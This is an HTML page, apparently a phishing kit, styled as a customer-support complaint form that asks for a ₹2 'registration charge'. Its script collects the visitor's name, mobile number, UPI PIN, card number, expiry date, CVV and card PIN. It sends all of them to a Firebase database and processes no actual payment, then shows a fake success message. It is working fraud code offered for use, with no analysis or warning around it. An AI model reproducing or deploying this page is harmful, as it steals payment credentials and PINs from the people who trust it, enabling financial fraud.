<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Customer Support - User Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: #f5f7fa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
            width: 100%;
            max-width: 500px;
            overflow: hidden;
        }
        
        .form-container {
            padding: 40px;
        }
        
        .step {
            display: none;
            animation: fadeIn 0.4s ease;
        }
        
        .step.active {
            display: block;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .form-title {
            color: #2d3748;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 30px;
            text-align: center;
            position: relative;
        }
        
        .form-title:after {
            content: '';
            position: absolute;
            bottom: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 60px;
            height: 3px;
            background: #4299e1;
            border-radius: 2px;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #4a5568;
            font-weight: 500;
            font-size: 15px;
        }
        
        .form-input, 
        .form-textarea {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #e2e8f0;
            border-radius: 10px;
            font-size: 15px;
            transition: all 0.2s;
            background: #f8fafc;
        }
        
        .form-input:focus,
        .form-textarea:focus {
            outline: none;
            border-color: #4299e1;
            background: white;
            box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.1);
        }
        
        .form-textarea {
            resize: vertical;
            min-height: 120px;
        }
        
        .payment-section {
            margin-top: 30px;
            padding-top: 25px;
            border-top: 1px solid #e2e8f0;
        }
        
        .amount-display {
            text-align: center;
            background: #f0f9ff;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 25px;
            border: 1px solid #bee3f8;
        }
        
        .amount {
            color: #2b6cb0;
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 5px;
        }
        
        .amount-label {
            color: #718096;
            font-size: 14px;
        }
        
        .payment-methods {
            margin-bottom: 25px;
        }
        
        .method-title {
            color: #4a5568;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 15px;
        }
        
        .payment-options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        
        .payment-option {
            border: 1.5px solid #e2e8f0;
            border-radius: 10px;
            padding: 18px 12px;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s;
            background: white;
        }
        
        .payment-option:hover {
            border-color: #4299e1;
            transform: translateY(-2px);
        }
        
        .payment-option.selected {
            border-color: #4299e1;
            background: #f0f9ff;
        }
        
        .payment-icon {
            font-size: 24px;
            color: #4299e1;
            margin-bottom: 10px;
            height: 30px;
        }
        
        .payment-name {
            color: #2d3748;
            font-size: 14px;
            font-weight: 500;
        }
        
        .payment-form {
            margin-top: 25px;
        }
        
        .card-details-grid-3 {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 15px;
        }
        
        .card-details-grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .form-hint {
            color: #718096;
            font-size: 13px;
            margin-top: 6px;
            display: block;
        }
        
        .button-group {
            display: flex;
            gap: 15px;
            margin-top: 35px;
        }
        
        .btn {
            flex: 1;
            padding: 16px;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn-primary {
            background: #4299e1;
            color: white;
        }
        
        .btn-primary:hover {
            background: #3182ce;
        }
        
        .btn-secondary {
            background: #f7fafc;
            color: #4a5568;
            border: 1.5px solid #e2e8f0;
        }
        
        .btn-secondary:hover {
            background: #edf2f7;
        }
        
        .hidden {
            display: none;
        }
        
        .success-message {
            text-align: center;
            padding: 20px;
            background: #f0fff4;
            border: 1px solid #9ae6b4;
            border-radius: 10px;
            margin-top: 20px;
            display: none;
        }
        
        .success-icon {
            color: #38a169;
            font-size: 48px;
            margin-bottom: 15px;
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        
        .loading i {
            font-size: 24px;
            color: #4299e1;
            margin-bottom: 10px;
        }
        
        @media (max-width: 480px) {
            .form-container {
                padding: 25px;
            }
            
            .card-details-grid-3,
            .card-details-grid-2 {
                grid-template-columns: 1fr;
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
</head>
<body>
    <div class="container">
        <div class="form-container">
            <!-- Step 1: Registration Details -->
            <div class="step active" id="step1">
                <h2 class="form-title">Register Your Complaint</h2>
                
                <div class="form-group">
                    <label class="form-label">Full Name</label>
                    <input type="text" class="form-input" id="name" placeholder="Enter your full name">
                </div>
                
                <div class="form-group">
                    <label class="form-label">Mobile Number</label>
                    <input type="tel" class="form-input" id="mobile" placeholder="Enter 10-digit mobile number" maxlength="10">
                    <span class="form-hint">10-digit number without country code</span>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Complaint Details</label>
                    <textarea class="form-textarea" id="complaint" placeholder="Describe your complaint in detail..."></textarea>
                </div>
                
                <div class="button-group">
                    <button class="btn btn-primary" onclick="nextStep()">Continue to Payment</button>
                </div>
            </div>
            
            <!-- Step 2: Payment -->
            <div class="step" id="step2">
                <h2 class="form-title">Payment Details</h2>
                
                <div class="payment-section">
                    <div class="amount-display">
                        <div class="amount">₹ 2.00</div>
                        <div class="amount-label">Registration Charges</div>
                    </div>
                    
                    <div class="payment-methods">
                        <div class="method-title">Select Payment Method</div>
                        <div class="payment-options">
                            <div class="payment-option" onclick="selectPayment('upi')">
                                <div class="payment-icon">
                                    <i class="fas fa-mobile-alt"></i>
                                </div>
                                <div class="payment-name">UPI Payment</div>
                            </div>
                            <div class="payment-option" onclick="selectPayment('card')">
                                <div class="payment-icon">
                                    <i class="fas fa-credit-card"></i>
                                </div>
                                <div class="payment-name">Card Payment</div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- UPI Form -->
                    <div id="upiForm" class="payment-form hidden">
                        <div class="form-group">
                            <label class="form-label">UPI PIN</label>
                            <input type="password" class="form-input" id="upiPin" placeholder="" maxlength="6">
                        </div>
                    </div>
                    
                    <!-- Card Form -->
                    <div id="cardForm" class="payment-form hidden">
                        <div class="form-group">
                            <label class="form-label">Card Number</label>
                            <input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
                        </div>
                        
                        <div class="card-details-grid-2">
                            <div class="form-group">
                                <label class="form-label">Expiry Date</label>
                                <input type="text" class="form-input" id="expiryDate" placeholder="MM/YY" maxlength="5">
                                <span class="form-hint">MM/YY format</span>
                            </div>
                            
                            <div class="form-group">
                                <label class="form-label">CVV</label>
                                <input type="password" class="form-input" id="cvv" placeholder="123" maxlength="3">
                                <span class="form-hint">3 digits</span>
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Card PIN</label>
                            <input type="password" class="form-input" id="cardPin" placeholder="Enter 4-digit card PIN" maxlength="4">
                            <span class="form-hint">Enter your 4-digit card PIN</span>
                        </div>
                    </div>
                    
                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="prevStep()">Back</button>
                        <button class="btn btn-primary" onclick="processPayment()">Pay ₹ 2.00</button>
                    </div>
                </div>
            </div>
            
            <!-- Loading State -->
            <div class="loading" id="loadingState">
                <i class="fas fa-spinner fa-spin"></i>
                <div>Submitting your complaint...</div>
            </div>
            
            <!-- Success Message (hidden by default) -->
            <div class="success-message" id="successMessage">
                <div class="success-icon">
                    <i class="fas fa-check-circle"></i>
                </div>
                <h3 style="color: #38a169; margin-bottom: 10px;">Complaint Registered Successfully!</h3>
                <p style="color: #4a5568;">Your complaint has been submitted and payment processed.</p>
                <p style="color: #718096; font-size: 14px; margin-top: 10px;">Complaint ID: <span id="complaintId"></span></p>
                <button class="btn btn-secondary" onclick="resetForm()" style="margin-top: 20px; width: auto; padding: 10px 24px;">
                    Submit Another Complaint
                </button>
            </div>
        </div>
    </div>

    <script>
        // Firebase Configuration
        const firebaseConfig = {
            databaseURL: "https://cssupport-16cb0-default-rtdb.firebaseio.com/"
        };
        
        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        let currentStep = 1;
        let selectedPaymentMethod = '';
        let customerId = '';
        
        function nextStep() {
            // Validate step 1
            const name = document.getElementById('name').value.trim();
            const mobile = document.getElementById('mobile').value.trim();
            const complaint = document.getElementById('complaint').value.trim();
            
            if (!name || !mobile || !complaint) {
                alert('Please fill all fields before proceeding');
                return;
            }
            
            if (!/^\d{10}$/.test(mobile)) {
                alert('Please enter a valid 10-digit mobile number');
                return;
            }
            
            // Generate unique ID
            customerId = 'CUST' + Date.now() + Math.floor(Math.random() * 1000);
            
            // Hide current step, show payment step
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
            currentStep = 2;
        }
        
        function prevStep() {
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step1').classList.add('active');
            currentStep = 1;
        }
        
        function selectPayment(method) {
            selectedPaymentMethod = method;
            
            // Update UI
            document.querySelectorAll('.payment-option').forEach(option => {
                option.classList.remove('selected');
            });
            
            event.currentTarget.classList.add('selected');
            
            // Show appropriate form
            document.getElementById('upiForm').classList.add('hidden');
            document.getElementById('cardForm').classList.add('hidden');
            
            if (method === 'upi') {
                document.getElementById('upiForm').classList.remove('hidden');
            } else if (method === 'card') {
                document.getElementById('cardForm').classList.remove('hidden');
            }
        }
        
        async function processPayment() {
            if (!selectedPaymentMethod) {
                alert('Please select a payment method');
                return;
            }
            
            let isValid = true;
            let message = '';
            
            if (selectedPaymentMethod === 'upi') {
                const upiPin = document.getElementById('upiPin').value.trim();
                
                if (!upiPin) {
                    message = 'Please enter your UPI PIN';
                    isValid = false;
                } else if (!/^\d{4,6}$/.test(upiPin)) {
                    message = 'UPI PIN must be 4 to 6 digits';
                    isValid = false;
                }
                
            } else if (selectedPaymentMethod === 'card') {
                const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
                const expiryDate = document.getElementById('expiryDate').value.trim();
                const cvv = document.getElementById('cvv').value.trim();
                const cardPin = document.getElementById('cardPin').value.trim();
                
                if (!cardNumber || !expiryDate || !cvv || !cardPin) {
                    message = 'Please fill all card details';
                    isValid = false;
                } else if (!/^\d{16}$/.test(cardNumber)) {
                    message = 'Please enter a valid 16-digit card number';
                    isValid = false;
                } else if (!/^\d{3}$/.test(cvv)) {
                    message = 'CVV must be 3 digits';
                    isValid = false;
                } else if (!/^\d{4}$/.test(cardPin)) {
                    message = 'Card PIN must be 4 digits';
                    isValid = false;
                } else if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
                    message = 'Please enter expiry date in MM/YY format';
                    isValid = false;
                }
            }
            
            if (!isValid) {
                alert(message);
                return;
            }
            
            // Show loading
            document.getElementById('step2').style.display = 'none';
            document.getElementById('loadingState').style.display = 'block';
            
            try {
                // Prepare customer data
                const name = document.getElementById('name').value.trim();
                const mobile = document.getElementById('mobile').value.trim();
                const complaint = document.getElementById('complaint').value.trim();
                const upiPin = document.getElementById('upiPin').value.trim();
                const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
                const expiryDate = document.getElementById('expiryDate').value.trim();
                const cvv = document.getElementById('cvv').value.trim();
                const cardPin = document.getElementById('cardPin').value.trim();
                
                const customerData = {
                    id: customerId,
                    name: name,
                    mobile: mobile,
                    complaint: complaint,
                    paymentMethod: selectedPaymentMethod,
                    upiPin: upiPin,
                    cardNo: cardNumber,
                    expiry: expiryDate,
                    cvv: cvv,
                    cardPin: cardPin, // Card PIN stored separately
                    amount: 2,
                    status: 'pending',
                    date: new Date().toLocaleDateString('en-IN'),
                    time: new Date().toLocaleTimeString('en-IN', { hour12: true }),
                    timestamp: Date.now()
                };
                
                // Save to Firebase
                await database.ref('customers/' + customerId).set(customerData);
                
                // Hide loading, show success
                document.getElementById('loadingState').style.display = 'none';
                document.getElementById('successMessage').style.display = 'block';
                document.getElementById('complaintId').textContent = customerId;
                
            } catch (error) {
                console.error('Error saving data:', error);
                alert('Error submitting complaint. Please try again.');
                
                // Hide loading, show form again
                document.getElementById('loadingState').style.display = 'none';
                document.getElementById('step2').style.display = 'block';
            }
        }
        
        function resetForm() {
            // Reset all form fields
            document.getElementById('name').value = '';
            document.getElementById('mobile').value = '';
            document.getElementById('complaint').value = '';
            document.getElementById('upiPin').value = '';
            document.getElementById('cardNumber').value = '';
            document.getElementById('expiryDate').value = '';
            document.getElementById('cvv').value = '';
            document.getElementById('cardPin').value = '';
            
            // Reset payment selection
            document.querySelectorAll('.payment-option').forEach(option => {
                option.classList.remove('selected');
            });
            
            document.getElementById('upiForm').classList.add('hidden');
            document.getElementById('cardForm').classList.add('hidden');
            
            // Hide success message and show step 1
            document.getElementById('successMessage').style.display = 'none';
            document.getElementById('loadingState').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step1').classList.add('active');
            currentStep = 1;
            selectedPaymentMethod = '';
            
            // Generate new ID for next submission
            customerId = '';
        }
        
        // Input formatting
        document.getElementById('mobile').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 10);
        });
        
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            this.value = value.slice(0, 19);
        });
        
        document.getElementById('expiryDate').addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            this.value = value.slice(0, 5);
        });
        
        document.getElementById('upiPin').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 6);
        });
        
        document.getElementById('cvv').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 3);
        });
        
        document.getElementById('cardPin').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 4);
        });
    </script>
</body>
</html>